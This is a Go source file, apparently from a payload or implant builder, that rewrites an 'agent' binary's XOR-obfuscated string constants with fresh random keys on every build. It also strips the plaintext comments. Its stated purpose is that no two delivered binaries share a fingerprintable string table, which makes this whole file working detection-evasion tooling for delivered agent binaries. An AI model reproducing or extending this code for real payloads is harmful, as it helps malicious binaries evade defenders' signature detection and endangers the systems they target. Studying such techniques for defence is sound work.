package payload

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"regexp"
	"strings"
)

// This file generates the per-build randomized string table
// (agent/strxor.go). Every agent build re-encodes the S* string constants with
// freshly generated XOR keys, so no two delivered binaries share a static,
// fingerprinter-friendly table — and the plaintext advisory comments never
// reach the delivered binary.

// strxorConstRegex parses `SName = "hexkey:base64data"` declarations.
var strxorConstRegex = regexp.MustCompile(`(S[A-Za-z0-9]+)\s*=\s*"([0-9a-fA-F]+:[A-Za-z0-9+/=]+)"`)

// decodeSConst recovers the plaintext from a `hexkey:base64` value using the
// same XOR scheme the agent runtime applies in mustDecrypt.
func decodeSConst(enc string) (string, error) {
	i := strings.IndexByte(enc, ':')
	if i < 0 {
		return "", fmt.Errorf("malformed string constant: missing ':'")
	}
	key, err := hex.DecodeString(enc[:i])
	if err != nil {
		return "", fmt.Errorf("bad key hex: %w", err)
	}
	data, err := base64.StdEncoding.DecodeString(enc[i+1:])
	if err != nil {
		return "", fmt.Errorf("bad data base64: %w", err)
	}
	// Some legacy template entries carry a key longer than the payload; the
	// original plaintext is recovered by truncating the key to the data length.
	if len(key) > len(data) {
		key = key[:len(data)]
	}
	if len(key) != len(data) {
		return "", fmt.Errorf("key/data length mismatch (%d != %d)", len(key), len(data))
	}
	out := make([]byte, len(data))
	for j := range data {
		out[j] = data[j] ^ key[j]
	}
	return string(out), nil
}

// encodeSConst obfuscates plaintext with a fresh random XOR key, matching the
// runtime `hexkey:base64` layout.
func encodeSConst(plain string) ([]byte, error) {
	key := make([]byte, len(plain))
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("crypto/rand.Read: %w", err)
	}
	data := make([]byte, len(plain))
	for j := range plain {
		data[j] = plain[j] ^ key[j]
	}
	return []byte(hex.EncodeToString(key) + ":" + base64.StdEncoding.EncodeToString(data)), nil
}

// randomizeStrxor regenerates the agent string table with a fresh random XOR
// key per constant. The template's build tag, package imports and runtime
// functions are preserved verbatim; the const values are re-encoded and the
// plaintext comments are stripped.
func randomizeStrxor() ([]byte, error) {
	src, err := payloadFS.ReadFile("agent/strxor.go")
	if err != nil {
		return nil, fmt.Errorf("read embedded strxor.go: %w", err)
	}
	text := string(src)

	constStart := strings.Index(text, "const (")
	noInline := strings.Index(text, "//go:noinline")
	if constStart < 0 || noInline < 0 || noInline < constStart {
		return nil, fmt.Errorf("embedded strxor.go structure unexpected")
	}

	header := text[:constStart]
	runtime := text[noInline:]

	matches := strxorConstRegex.FindAllStringSubmatch(text[constStart:noInline], -1)
	if len(matches) == 0 {
		return nil, fmt.Errorf("embedded strxor.go const block has no S* entries")
	}

	maxName := 0
	for _, m := range matches {
		if len(m[1]) > maxName {
			maxName = len(m[1])
		}
	}

	var b strings.Builder
	b.WriteString(header)
	b.WriteString("const (\n")
	for _, m := range matches {
		plain, err := decodeSConst(m[2])
		if err != nil {
			return nil, fmt.Errorf("decode %s: %w", m[1], err)
		}
		enc, err := encodeSConst(plain)
		if err != nil {
			return nil, fmt.Errorf("encode %s: %w", m[1], err)
		}
		b.WriteString("\t" + m[1] + strings.Repeat(" ", maxName-len(m[1])) + ` = "` + string(enc) + `"` + "\n")
	}
	b.WriteString(")\n\n")
	b.WriteString(runtime)
	return []byte(b.String()), nil
}
